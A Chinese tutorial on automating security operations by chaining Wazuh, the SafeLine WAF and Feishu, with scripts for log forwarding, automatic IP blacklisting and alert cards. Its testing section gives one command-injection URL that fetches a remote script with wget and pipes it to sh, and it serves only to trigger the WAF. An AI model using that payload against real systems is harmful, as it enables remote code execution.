---
title: "自动化安全运营实操案例: Wazuh X 雷池WAF X 飞书"
---

# 自动化安全运营实操案例: Wazuh X 雷池WAF X 飞书

作者：曼联小胖子（社区42群）

## 背景

作为中小型企业的安全工程师，往往面临资源有限（没SOC/SOAR）、人手不足的情况，很可能1个人要负责运营公司所有安全产品（例如我）。
为了提升安全运营的工作效率，我们需要解决以下问题：

1. 避免频繁切换安全系统看日志
2. 避免人工封禁IP的傻瓜式操作
3. 将攻击详情以及处置告警及时通知到相关人员，并且方便随时讨论

本文主要介绍“Wazuh X 雷池WAF X 飞书”联动的场景，另外，实际工作中还能产生”Wazuh X 网络/安全设备 X 飞书"、”Wazuh X 服务器 X 飞书"、“Wazuh X 蜜罐 X飞书“的应用，以后有时间再逐个开坑做案例分享。

## 软件介绍

### Wazuh

一款国外的SIEM平台，可以理解为安全版的ELK，具有日志统计分析、可视化、主机监控等功能。目前github有9.2k star，目前分为Saas版和开源版。
Wazuh分为Server端以及Agent，Agent可以对服务器进行日志监控、漏洞检测、安全合规基线扫描、进程收集，集成Virus Total接口后可具备磁盘恶意文件检测能力。

本文中使用的是私有部署的开源版 **4.7.3**，主要提供日志监控、下发指令自动处置的能力。

### 雷池社区版

雷池（SafeLine）是长亭科技耗时近 10 年倾情打造的WAF，核心检测能力由智能语义分析算法驱动，目前分为社区版、专业版和企业版。

本文使用的是私有部署的社区版 **5.4.0**，主要提供Web安全检测防护能力、产生安全日志。

### 飞书

一款字节跳动旗下的工作协同平台和IM软件，读者公司若使用钉钉、企业微信也可以达到一样效果。

本文使用的是商业版 **7.15.9** ，主要用于接收告警通知和工作沟通，相比传统邮件的沟通方式更高效。

## 工作流程图

![Alt text](/images/docs/submission/operate.png)

效果图

![Alt text](/images/docs/submission/operate-1.png)

![Alt text](/images/docs/submission/operate-2.png)

### 前置工作

#### 服务器2台

Wazuh Server服务器：操作系统本文以CentOS 7.6为例，该服务器需要部署Wazuh Server以及处置python脚本，CPU、内存、硬盘要求可参考官方文档和下图：
​
![Alt text](/images/docs/submission/operate-3.png)

雷池WAF服务器：32G内存，4核CPU，100G硬盘，操作系统本文以Rocky Linux 9.3为例，代替将要停服的CentOS7。该服务器需要部署雷池WAF以及Wazuh Agent。

#### 安装Wazuh Server

Wazuh Server的组件以及功能非常多，还支持集群部署。由于篇幅问题本文不展开进行阐述，旨在快速部署环境。
运行官方一键安装脚本，建议挂魔法，避免安装过程失败。

 ```shell
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a
```

安装完成后会输出web访问地址和admin密码，输入https://ip 后即可访问wazuh的web界面。

如果访问不了，请检查防火墙是否放开443端口。

```shell
INFO: --- Summary ---
INFO: You can access the web interface https://<wazuh-dashboard-ip>
    User: admin
    Password: <ADMIN_PASSWORD>
INFO: Installation finished.
```

如还有安装问题，见官方安装文档并自行根据提示和日志进行排查。

### 安装雷池WAF

1. 安装docker 

    ```shell
    #删除旧版本docker
    sudo yum remove docker \
            docker-client \
            docker-client-latest \
            docker-common \
            docker-latest \
            docker-latest-logrotate \
            docker-logrotate \
            docker-engine
    #安装最新版本docker
    sudo yum install -y yum-utils
    sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
    sudo yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    sudo systemctl start docker
    sudo systemctl enable docker
    ```

2. 安装雷池WAF

    ```shell
    CDN=1 bash -c "$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)"
    ```

    安装完成后，注意防火墙放开9443端口，初始账号为admin，密码在安装完waf后会随机生成：

    ![](/images/docs/submission/operate-4.png)

    如还有安装问题，见官方安装文档。


### 安装Wazuh Agent

1. 本地用浏览器登录Wazuh Web管理界面: 

    ![Alt text](/images/docs/submission/operate-5.png)

2. 进入部署界面

    ![Alt text](/images/docs/submission/operate-6.png)

3. 生成Wazuh Agent部署命令

    ![Alt text](/images/docs/submission/operate-7.png)

4. 登录雷池WAF服务器，执行以下命令，安装Wazuh Agent。注意Wazuh Server的1514、1515端口要开放给雷池WAF服务器访问。 

    ```shell
    curl -o wazuh-agent-4.7.4-1.x86_64.rpm https://packages.wazuh.com/4.x/yum/wazuh-agent-4.7.4-1.x86_64.rpm && sudo WAZUH_MANAGER='192.168.31.24' WAZUH_AGENT_NAME='waf' rpm -ihv wazuh-agent-4.7.4-1.x86_64.rpm
    sudo systemctl daemon-reload
    sudo systemctl enable wazuh-agent
    sudo systemctl start wazuh-agent
    ```

### 安装飞书

官网直接下载飞书安装即可

## 配置过程

### 雷池WAF配置

1. 本地浏览器登录雷池WAF管理界面，根据自己公司的实际情况，添加要保护的域名，例如a.test.com 

    ![Alt text](/images/docs/submission/operate-8.png)

2. 添加一个自定义IP组，后面做黑名单用。 

    ![Alt text](/images/docs/submission/operate-9.png)

3. 添加一个黑名单，关联上一步创建的IP组。

    ![Alt text](/images/docs/submission/operate-10.png)

4. 根据实际情况，配置雷池WAF的安全功能 

    ![Alt text](/images/docs/submission/operate-11.png)

### 雷池WAF服务器配置

1. 登录雷池WAF服务器，映射雷池pgsql数据库本地登录端口5432到宿主机，后续shell脚本需要登录数据库： 

    ```shell
    docker stop safeline-pg
    systemctl stop docker
    vim /var/lib/docker/containers/$(docker ps --no-trunc | grep safeline-pg | awk '{print $1}')/hostconfig.json  ，#找到PortBindings，修改为以下配置"PortBindings":{"5432/tcp":[{"HostIp":"127.0.0.1","HostPort":"5432"}]},  
    systemctl start docker 
    netstat -tnlp | grep 5432 #查看pgsql数据库的端口是否成功映射到宿主机
    ```

2. 获取pgsql数据库的密码：

    ```shell
    cat /data/safeline/.env | grep POSTGRES_PASSWORD | tail -n 1 | awk -F '=' '{print $2}'
    ```

3. 创建.pgpass，后续传递密码给shell脚本使用： 
    ```shell
    vim /var/scripts/.pgpass,添加以下参数
    localhost:5432:safeline-ce:safeline-ce:abcd #把abcd替换成第2步中获取到的密码
    ```

4. 创建shell脚本，主要功能是生成syslog日志给wazuh监控使用： 

    ```shell
    mkdir /var/log/waf_alert
    touch /var/log/waf_alert/waf_alert.log
    touch /var/scripts/waf_log.sh
    chmod u+x /var/scripts/waf_log.sh
    vim /var/scripts/waf_log.sh，添加以下代码
    #!/bin/bash
    
    # 设置PGPASSFILE环境变量
    export PGPASSFILE=/var/scripts/.pgpass
    
    # PostgreSQL 的连接信息
    PG_HOST="localhost"
    PORT="5432"
    DATABASE="safeline-ce"
    USERNAME="safeline-ce"
    HOSTNAME=$(hostname) 
    PROGRAM_NAME="safeline-ce"
    
    #获取最后一条WAF攻击事件日志的ID，日志数据存储在MGT_DETECT_LOG_BASIC表中
    LAST_ID=$(psql -h $PG_HOST -p $PORT -U $USERNAME -d $DATABASE -t -P footer=off -c "SELECT id FROM PUBLIC.MGT_DETECT_LOG_BASIC ORDER BY id desc limit 1")
    while true;do
    #从pgsql数据库中获取waf的最新攻击事件日志，如果没有产生新日志，这条SQL会返回空
        raw_log=$(psql -h $PG_HOST -p $PORT -U $USERNAME -d $DATABASE -t -P footer=off -c "SELECT TO_CHAR(to_timestamp(timestamp) AT TIME ZONE 'Asia/Hong_Kong', 'Mon DD HH24:MI:SS'), CONCAT(PROVINCE, CITY) AS SRC_CITY, SRC_IP, CONCAT(HOST, ':', DST_PORT) AS HOST,url_path,rule_id,id FROM PUBLIC.MGT_DETECT_LOG_BASIC where id > '$LAST_ID' ORDER BY id asc limit 1")
    #检查SQL查询结果，如果有新加的日志就执行以下操作，把SQL查询结果重写为syslog日志，并记录到/var/log/waf_alert/waf_alert.log
        if [ -n "$raw_log" ]; then
            ALERT_TIME=$(echo "$raw_log" | awk -F ' \\| ' '{print $1}')
            SRC_CITY=$(echo "$raw_log" | awk -F ' \\| ' '{print $2}')
            SRC_IP=$(echo "$raw_log" | awk -F ' \\| ' '{print $3}')
            DST_HOST=$(echo "$raw_log" | awk -F ' \\| ' '{print $4}')
            URL=$(echo "$raw_log" | awk -F ' \\| ' '{print $5}')
            RULE_ID=$(echo "$raw_log" | awk -F ' \\| ' '{print $6}')
            EVENT_ID=$(echo "$raw_log" | awk -F ' \\| ' '{print $7}')
            syslog="src_city:$SRC_CITY, src_ip:$SRC_IP, dst_host:$DST_HOST, url:$URL, rule_id:$RULE_ID, log_id:$EVENT_ID"
            echo $ALERT_TIME $HOSTNAME $PROGRAM_NAME: $syslog >> /var/log/waf_alert/waf_alert.log
    #更新最后处理的事件ID
            LAST_ID=$(($LAST_ID+1))
        fi
        sleep 3     
    done
    ```

5. 后台运行监控脚本，并且添加开机启动： 

    ```shell
    nohup /var/scripts/waf_log.sh > /dev/null 2>&1 &
    vim /etc/rc.local，添加以下代码
    nohup /var/scripts/waf_log.sh > /dev/null 2>&1 &
    ```

### 飞书配置

1. 添加一个安全告警通知群和群机器人，后面需要通过这个机器人发告警卡片到群里。

    ![Alt text](/images/docs/submission/operate-16.png)

2. 选择自定义机器人。

    ![Alt text](/images/docs/submission/operate-17.png)

3. 保存webhook地址，后面配置wazuh脚本要用。

    ![Alt text](/images/docs/submission/operate-18.png)

### Wazuh Server配置

1. 添加触发告警时调用的脚本，一共有2个文件，这是custom-waf文件，不用做任何修改

    ```shell
    touch /var/ossec/integrations/custom-waf
    chmod 750 /var/ossec/integrations/custom-waf
    chown root:wazuh /var/ossec/integrations/custom-waf
    vim /var/ossec/integrations/custom-waf ，添加以下代码：
    
    #!/bin/sh
    # Copyright (C) 2015, Wazuh Inc.
    # Created by Wazuh, Inc. <info@wazuh.com>.
    # This program is free software; you can redistribute it and/or modify it under the terms of GPLv2
    
    WPYTHON_BIN="framework/python/bin/python3"
    
    SCRIPT_PATH_NAME="$0"
    
    DIR_NAME="$(cd $(dirname ${SCRIPT_PATH_NAME}); pwd -P)"
    SCRIPT_NAME="$(basename ${SCRIPT_PATH_NAME})"
    
    case ${DIR_NAME} in
        */active-response/bin | */wodles*)
            if [ -z "${WAZUH_PATH}" ]; then
                WAZUH_PATH="$(cd ${DIR_NAME}/../..; pwd)"
            fi
    
            PYTHON_SCRIPT="${DIR_NAME}/${SCRIPT_NAME}.py"
        ;;
        */bin)
            if [ -z "${WAZUH_PATH}" ]; then
                WAZUH_PATH="$(cd ${DIR_NAME}/..; pwd)"
            fi
    
            PYTHON_SCRIPT="${WAZUH_PATH}/framework/scripts/${SCRIPT_NAME}.py"
        ;;
        */integrations)
            if [ -z "${WAZUH_PATH}" ]; then
                WAZUH_PATH="$(cd ${DIR_NAME}/..; pwd)"
            fi
    
            PYTHON_SCRIPT="${DIR_NAME}/${SCRIPT_NAME}.py"
        ;;
    esac
    
    ${WAZUH_PATH}/${WPYTHON_BIN} ${PYTHON_SCRIPT} "$@" 
    ```

2. 这是封禁IP以及发飞书告警的python脚本custom-waf.py，我用的是centos自带的python 2.7.5，注释部分需更改为自己的信息

    ```shell
    mkdir /var/log/waf/block_ip.log
    chown wazuh:wazuh /var/log/waf/block_ip.log
    chmod 644 /var/log/waf/block_ip.log
    touch /var/ossec/integrations/custom-waf.py
    chmod 750 /var/ossec/integrations/custom-waf.py
    chown root:wazuh /var/ossec/integrations/custom-waf.py
    vim /var/ossec/integrations/custom-waf.py ，添加以下代码：
    ```

    ```shell
    #!/usr/bin/env python
    import sys
    import json
    import ssl
    import requests
    import os
    import datetime
    import urllib3  
    from urllib3.exceptions import InsecureRequestWarning
    urllib3.disable_warnings(InsecureRequestWarning)
    
    def read_alert_file():
        alert_file = open(sys.argv[1])
        alert_json = json.loads(alert_file.read())
        alert_file.close()
        timestamp = alert_json['predecoder']['timestamp']
        hostname = alert_json['predecoder']['hostname']
        description = alert_json['rule']['description']
        full_log = alert_json['full_log']
        src_city = alert_json['data']['src_city']
        src_ip = alert_json['data']['src_ip']
        dst_host = alert_json['data']['dst_host']
        dst_url = alert_json['data']['dst_url']
        print(src_ip)
        return timestamp,hostname,description,full_log,src_city,src_ip,dst_host,dst_url
    
    def login(host,username,password):
        csrf_url = f"{host}/api/open/auth/csrf"  
        response = requests.get(csrf_url, verify=False)
        data = response.json()
        csrf_token = data["data"]["csrf_token"] 
        login_data = {  
            'csrf_token': csrf_token,  
            'username': username,  
            'password': password,  
        } 
        login_url = f"{host}/api/open/auth/login"
        response = requests.post(login_url,json=login_data,verify=False)
        data = response.json()
        jwt = data["data"]["jwt"]
        return jwt
    
    def get_info(host,jwt):
        url = f"{host}/api/open/ipgroup?top=1001"
        headers={
        "Content-Type": "application/json", 
        "Authorization": f"Bearer {jwt}"
        }
        response = requests.get(url,headers=headers,verify=False) 
        data = response.json()
        ip_group_id = data["data"]["nodes"][-1]["id"]
        ip_group_name = data["data"]["nodes"][-1]["comment"]
        ips = data["data"]["nodes"][-1]["ips"]
        ips_count = len(ips)
        url = f"{host}/api/open/rule"
        requests.get(url,headers=headers,verify=False) 
        return ip_group_id,ip_group_name,ips,ips_count
    
    def update_ip_group(host,jwt,ip_group_id,ip_group_name,ips,src_ip):
        url = f"{host}/api/open/ipgroup" 
        ips.append(src_ip) 
        headers={
            "Content-Type": "application/json", 
            "Authorization": f"Bearer {jwt}"
        }
        body = {
            "id":ip_group_id,
            "reference":"",
            "comment":ip_group_name,
            "ips":ips
        }
        requests.put(url,json=body,headers=headers,verify=False)
    
    def create_ip_group(host,jwt,ip_group_id,ip_group_name,src_ip):
        url = f"{host}/api/open/ipgroup"
        ip_group_id = ip_group_id +1
        ip_group_name = "black_ip_group_name-" + str(ip_group_id)
        src_ip = [src_ip]
        headers={
            "Content-Type": "application/json", 
            "Authorization": f"Bearer {jwt}"
        }
        body = {
            "reference":"",
            "comment":ip_group_name,
            "ips":src_ip
        }
        requests.post(url,json=body,headers=headers,verify=False)
        return ip_group_id,ip_group_name
    
    def create_rule(host,jwt,ip_group_id,ip_group_name):
        url = f"{host}/api/open/rule"
        headers={
            "Content-Type": "application/json", 
            "Authorization": f"Bearer {jwt}"
        }
        body = {
            "action": 1,
            "comment": ip_group_name,
            "is_enabled": True,
            "pattern": [{
                "k": "src_ip",
                "op": "in",
                "v": str(ip_group_id),
                "sub_k": ""
            }]
        }
        requests.post(url,json=body,headers=headers,verify=False)
    
    def feishu(webhook_url,timestamp,hostname,description,full_log,src_city,src_ip,dst_host,dst_url):
        headers={
            "Content-Type": "application/json"
        }
        msg_data = {
            "msg_type": "interactive",
            "card": {
                "header": {
                    "title": {
                        "tag": "plain_text",
                        "content": description
                    },
                    "template": "red"
                },
                "elements": [
                    {
                        "tag": "div",
                        "text": {
                            "tag": "lark_md",
                            "content": "**请注意：以下攻击源IP已加入黑名单。**" + "\n\n" + "**告警时间: **" + timestamp + "\n" + "**告警来源: **" + hostname + "\n" + "**攻击源地址: **" + src_city + "\n" + "**攻击源IP: **" + src_ip + "\n" + "**被攻击地址: **" + dst_host + "\n" + "**被攻击路径: **" + dst_url
                        }
                    },
                    {
                        "tag": "hr"
                    },
                    {
                        "tag": "div",
                        "text": {
                            "tag": "lark_md",
                            "content": "**原始syslog日志:**" + "\n" + full_log
                        }
                    },
                ]
            }
        }
        requests.post(webhook_url,json=msg_data,headers=headers)
        
    def print_log(log_file_path,src_ip):
        now = datetime.datetime.now()  
        time_str = now.strftime('%b %d %H:%M:%S')  
        log_template = "{time} prod-waf safe-line:{ip} has been blocked." 
        message = log_template.format(time=time_str, ip=src_ip) 
        log_file_path = log_file_path
        with open(log_file_path, 'a') as log_file:  
            log_file.write(message + '\n') 
    
    def main(host,username,password,log_file_path,webhook_url):
        timestamp,hostname,description,full_log,src_city,src_ip,dst_host,dst_url = read_alert_file()
        jwt = login(host,username,password)
        ip_group_id,ip_group_name,ips,ips_count = get_info(host,jwt)
        if ips_count > 999:
            ip_group_id,ip_group_name = create_ip_group(host,jwt,ip_group_id,ip_group_name,src_ip)
            create_rule(host,jwt,ip_group_id,ip_group_name)
        else:
            update_ip_group(host,jwt,ip_group_id,ip_group_name,ips,src_ip)
        feishu(webhook_url,timestamp,hostname,description,full_log,src_city,src_ip,dst_host,dst_url)
        print_log(log_file_path,src_ip)
    
    host = "https://192.168.1.1:9443" #替换成WAF地址
    log_file_path = "/var/log/waf/block_ip.log"
    webhook_url = "https://open.feishu.cn/open-apis/bot/v2/hook/c742cec0-94e9-449b-8473-597b873" #替换成飞书机器人地址
    username = "admin"
    password = "123456" #替换成WAF密码
    if __name__ == "__main__":  
        main(host,username,password,log_file_path,webhook_url)
        sys.exit(0)
    ```

3. 添加Wazuh Server解码器

    ```shell
    touch /var/ossec/etc/decoders/safeline-waf-decoders.xml
    chmod 660 /var/ossec/etc/decoders/safeline-waf-decoders.xml
    chown wazuh:wazuh /var/ossec/etc/decoders/safeline-waf-decoders.xml
    vim /var/ossec/etc/decoders/safeline-waf-decoders.xml，添加以下代码：
    ```

    ```shell
    <decoder name="safeline-ce">
    <program_name>safeline-ce</program_name>
    <regex>src_city:(\.*), src_ip:(\.*), dst_host:(\.*), url:(\.*), rule_id:(\.*), log_id:(\d+)</regex>
    <order>src_city,src_ip,dst_host,dst_url,rule_id,log_id</order>
    </decoder>
    ```

4. 添加Wazuh Server告警规则

    ```shell
    touch /var/ossec/etc/rules/safeline-waf-rules.xml
    chmod 660 /var/ossec/etc/rules/safeline-waf-rules.xml
    chown wazuh:wazuh /var/ossec/etc/rules/safeline-waf-rules.xml
    vim /var/ossec/etc/rules/safeline-waf-rules.xml，添加以下代码：
    ```

    ```shell
    <group name="syslog,safeline,">
    <rule id="119101" level="7">
        <decoded_as>safeline-ce</decoded_as>
        <match>a.test.com</match>#a.test.com替换成在waf上配置保护的域名
        <description>入侵事件:a.test.com</description> #这里可以修改为自己喜欢的内容，这个信息最终会呈现到飞书消息卡片的标题上
    </rule>
    ```

5. 修改Wazuh Server的ossec配置

    ```shell
    vim /var/ossec/etc/ossec.conf,添加以下代码：
    <integration>
        <name>custom-waf</name>
        <rule_id>119101</rule_id>
        <alert_format>json</alert_format>
    </integration>
    ```

6. 重启Wazuh Server，使所有配置生效

    ```shell
    /var/ossec/bin/wazuh-control restart
    ```

### Wazuh Agent配置

1. 登录雷池WAF服务器，配置ossec监听waf_alert.log日志文件

    ```shell
    vim /var/ossec/etc/ossec.conf ，添加以下配置
    
    <localfile>
        <log_format>syslog</log_format>
        <location>/var/log/waf_alert/waf_alert.log</location>
    </localfile>
    ```

    最后如图

    ![Alt text](/images/docs/submission/operate-19.png)

2. 重启Wazuh Agent，使ossec配置生效

    ```shell
    systemctl restart wazuh-agent
    ```

## 大功告成，测试效果

对网站进行漏扫或者输入攻击测试语句，触发告警，查看拦截结果，例如

https://a.test.com/view.php?doc=11.jpg&format=swf&isSplit=true&page=||wget%20http://spotslfy.com/wget.sh%20-O-|sh

飞书告警卡片，群里的相关人员都可以看到非常清晰的消息卡片

![Alt text](/images/docs/submission/operate-12.png)

雷池WAF IP黑名单，可以看到攻击源IP 47.1.1.1已经自动添加

![Alt text](/images/docs/submission/operate-13.png)

当攻击者想再次尝试访问网站，已经被拦截

![Alt text](/images/docs/submission/operate-14.png)

如果想统计一共封了多少个黑名单IP，可以直接查看日志

cat /var/log/waf/block_ip.log

![Alt text](/images/docs/submission/operate-15.png)

## 发散思维

由于个人精力有限，关于飞书告警其实我还有2个想法没实现，有兴趣和开发能力的同学可以继续探索：

1. 为了避免误封IP，其实推送到飞书的卡片消息可以增加两个交互按钮：“确认封禁IP”，“忽略”，当点击“确认封禁IP”时才触发封禁IP，同时发送一条处置结果到群里做通知。

2. 告警信息推送到飞书群后，现在是无法做统计分析的。飞书多维表格有基础的excel能力以及强悍的自动化流程能力，经过精心的表格字段设计、自动化流程配置和API开发，可以作为低成本的安全数据中心和SOAR使用，例如定期推送安全周报到飞书安全工作群、定期汇总恶意IP清单并推送给安全设备等